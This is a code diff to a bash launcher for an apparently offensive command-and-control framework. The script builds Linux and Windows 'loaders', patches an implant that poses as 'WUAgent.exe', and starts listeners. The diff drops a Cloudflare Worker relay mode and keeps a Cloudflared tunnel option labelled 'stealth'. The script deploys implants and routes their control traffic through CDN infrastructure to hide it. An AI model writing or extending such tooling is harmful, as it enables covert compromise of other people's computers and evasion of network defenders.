@@ -44,7 +44,6 @@ while [[ $# -gt 0 ]]; do
         --port)     SERVE_PORT="$2"; shift ;;
         --c2port)   C2_PORT="$2"; shift ;;
         --lhost)    LHOST="$2"; shift ;;
-        --relay)    RELAY_DOMAIN="$2"; shift ;;
         --tunnel)   TUNNEL_MODE=true; if [[ -n "$2" && "$2" != --* ]]; then RELAY_DOMAIN="$2"; shift; fi ;;
         *)          echo "[!] Unknown arg: $1"; exit 1 ;;
     esac
@@ -98,16 +97,14 @@ if $INTERACTIVE; then
     echo -e "  ${W}[1]${N} Deploy Linux loader"
     echo -e "  ${W}[2]${N} Deploy Windows loader"
     echo -e "  ${W}[3]${N} Deploy both"
-    echo -e "  ${W}[4]${N} Deploy Windows + CDN relay ${D}(Cloudflare Worker)${N}"
-    echo -e "  ${W}[5]${N} Deploy Windows + Cloudflared tunnel ${D}(FREE, auto URL)${N}"
+    echo -e "  ${W}[4]${N} Deploy Windows + Cloudflared tunnel ${D}(FREE, stealth)${N}"
     echo ""
-    read -rp "  Select [1-5]: " choice
+    read -rp "  Select [1-4]: " choice
     case "$choice" in
         1) BUILD_LINUX=true ;;
         2) BUILD_WINDOWS=true ;;
         3) BUILD_LINUX=true; BUILD_WINDOWS=true ;;
-        4) BUILD_WINDOWS=true; RELAY_DOMAIN="auto" ;;
-        5) BUILD_WINDOWS=true; TUNNEL_MODE=true ;;
+        4) BUILD_WINDOWS=true; TUNNEL_MODE=true ;;
         *) echo "[!] Invalid choice"; exit 1 ;;
     esac
     echo ""
@@ -529,20 +526,7 @@ open_in_terminal() {
 
 # ── Start listener in THIS terminal (foreground) ──────────────────
 start_listener_foreground() {
-    # Relay mode (Worker only, NOT tunnel) — use relay listener
-    if [ -n "$RELAY_DOMAIN" ] && [ "$TUNNEL_MODE" != true ] && [ -f "$ROOT/relay/listener_relay.py" ]; then
-        echo -e "${C}══════════════════════════════════════${N}"
-        echo -e "${W}  C2 Relay Listener — ${RELAY_DOMAIN}${N}"
-        echo -e "${C}══════════════════════════════════════${N}"
-        echo -e "  ${D}Traffic: Implant → CF CDN → Worker → WSS → Here${N}"
-        echo ""
-
-        cd "$ROOT/relay"
-        python3 listener_relay.py
-        return
-    fi
-
-    # Direct mode — local WSS listener
+    # Direct / tunnel mode — local listener
     local listener_dir=""
     if $BUILD_WINDOWS || [ -f "$STAGE_DIR/WUAgent.exe" ]; then
         listener_dir="$ROOT/ERS-W"
@@ -755,22 +739,7 @@ if [ "$TUNNEL_MODE" = true ] && [ -z "$RELAY_DOMAIN" ]; then
     fi
 fi
 
-# Deploy relay first (so RELAY_DOMAIN is set before patching implant)
-if [ "$RELAY_DOMAIN" = "auto" ]; then
-    deploy_relay
-    if [ -z "$RELAY_DOMAIN" ] || [ "$RELAY_DOMAIN" = "auto" ]; then
-        echo -e "${R}[!]${N} Relay deploy failed. Falling back to direct mode."
-        RELAY_DOMAIN=""
-    else
-        echo -e "  ${G}[+]${N} Relay mode active: ${RELAY_DOMAIN}"
-    fi
-elif [ -n "$RELAY_DOMAIN" ]; then
-    echo -e "  ${G}[+]${N} Using relay: ${RELAY_DOMAIN}"
-    # Patch listener_relay.py if domain provided manually
-    if [ -f "$ROOT/relay/listener_relay.py" ]; then
-        sed -i "s|WORKER_URL = \"[^\"]*\"|WORKER_URL = \"wss://${RELAY_DOMAIN}/?r=l\"|" "$ROOT/relay/listener_relay.py"
-    fi
-fi
+# Tunnel domain is already set above — no relay deploy needed
 
 $BUILD_LINUX && build_linux
 $BUILD_WINDOWS && build_windows
